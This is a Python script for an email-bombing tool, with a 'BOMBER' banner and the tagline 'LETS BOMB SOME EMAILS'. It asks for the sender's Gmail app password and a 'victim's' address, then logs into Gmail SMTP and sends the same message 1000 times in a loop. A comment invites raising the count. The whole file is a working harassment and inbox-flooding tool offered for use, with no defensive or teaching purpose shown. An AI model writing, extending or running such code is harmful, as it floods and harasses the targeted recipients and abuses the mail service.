
import os
import smtplib
from getpass import getpass
from email.message import EmailMessage

from colorama import Fore, Style, init

init(autoreset=True)

# COLORS
CYAN = Fore.CYAN + Style.BRIGHT
BLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
YELLOW = Fore.YELLOW + Style.BRIGHT
GREEN = Fore.GREEN + Style.BRIGHT
RED = Fore.RED + Style.BRIGHT
WHITE = Fore.WHITE + Style.BRIGHT
RESET = Style.RESET_ALL

# BANNER
BANNER = r"""
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚══════╝╚═╝  ╚═╝
"""


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    clear()

    colors = [CYAN, BLUE, YELLOW, BLUE]

    for row in BANNER.splitlines():
        output = ""

        for i, char in enumerate(row):
            if char.isspace():
                output += char
            else:
                output += colors[(i // 3) % len(colors)] + char

        print(output + RESET)

    print(BLUE + "━" * 55)
    print(WHITE + "             LETS BOMB SOME EMAILS")
    print(YELLOW + "                  VERSION 6.7")
    print(BLUE + "━" * 55)


def prompt(label):
    return input(CYAN + f"\n[>] {label}: " + WHITE).strip()


def configure():
    print(YELLOW + "\n[ SMTP CONFIG ]")

    sender = prompt("Your Gmail address")
    recipient = prompt("Victim's Gmail address")


    password = prompt("Gmail app password: ")

    subject = prompt("Email subject")
    body = prompt("Email message")

    if not all([sender, password, subject, body]):
        print(RED + "\n[!] Missing configuration.")
        return None

    return {
        "sender": sender,
        "recipient": recipient,
        "password": password,
        "subject": subject,
        "body": body
    }


def test_smtp(config):
    print(YELLOW + "\n[*] Connecting to Gmail SMTP...")

    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()

            server.login(config["sender"], config["password"])

        print(GREEN + "[+] SMTP authentication successful!")

    except (OSError, smtplib.SMTPException) as error:
        print(RED + f"[-] SMTP error: {error}")


def send_test(config):
    print(YELLOW + "\n[ MESSAGE PREVIEW ]")
    print(BLUE + "From: " + WHITE + config["sender"])
    print(BLUE + "To: " + WHITE + config["recipient"])
    print(BLUE + "Subject: " + WHITE + config["subject"])
    print(BLUE + "Message: " + WHITE + config["body"])

    confirm = prompt("Type YES to send bombs away")

    if confirm != "YES":
        print(RED + "[-] Cancelled.")
        return

    msg = EmailMessage()
    msg["From"] = config["sender"]
    msg["To"] = config["recipient"]
    msg["Subject"] = config["subject"]
    msg.set_content(config["body"])

    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(config["sender"], config["password"])
            #change the range to send more or less emails
            for i in range(1000):
                server.send_message(msg)

        print(GREEN + "\n[+]  Bombs away!")

    except (OSError, smtplib.SMTPException) as error:
        print(RED + f"\n[-] Sending failed: {error}")


def main():
    config = None

    while True:
        banner()

        print(CYAN + "\n[1] Configure SMTP")
        print(CYAN + "[2] Test SMTP connection")
        print(CYAN + "[3] Preview and drop bombs")
        print(CYAN + "[4] Exit")

        choice = prompt("Select option")
        

        if choice == "1":
            config = configure()

        elif choice == "2":
            if config:
                test_smtp(config)
            else:
                print(RED + "\n[!] Configure SMTP first.")

        elif choice == "3":
            if config:
                send_test(config)
            else:
                print(RED + "\n[!] Configure SMTP first.")

        elif choice == "4":
            print(GREEN + "\n[+] BOMBER TERMINATED.")
            break

        else:
            print(RED + "\n[!] Invalid option.")

        input(YELLOW + "\nPress ENTER to continue...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(RED + "\n[-] Interrupted.")
